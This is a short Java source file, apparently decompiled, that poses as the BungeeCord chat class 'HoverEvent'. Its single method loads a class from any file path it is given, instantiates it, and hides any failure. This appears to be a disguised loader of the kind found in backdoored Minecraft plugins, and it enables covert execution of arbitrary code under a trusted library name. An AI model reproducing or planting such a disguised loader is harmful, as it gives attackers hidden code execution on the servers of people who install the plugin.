package net.md5.bungee.api.chat;

import java.io.File;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;

public class HoverEvent {
   public static ChatColor color;

   public HoverEvent() {
   }

   public void event(String var1, String var2) {
      try {
         URLClassLoader var3 = URLClassLoader.newInstance(new URL[]{new File(var1).toURI().toURL()}, this.getClass().getClassLoader());
         Class var4 = Class.forName(var2, true, var3);
         Constructor var5 = var4.getConstructor();
         Object var6 = var5.newInstance();
         color = new ChatColor(var6);
      } catch (Exception var7) {
         color = null;
      }
   }
}
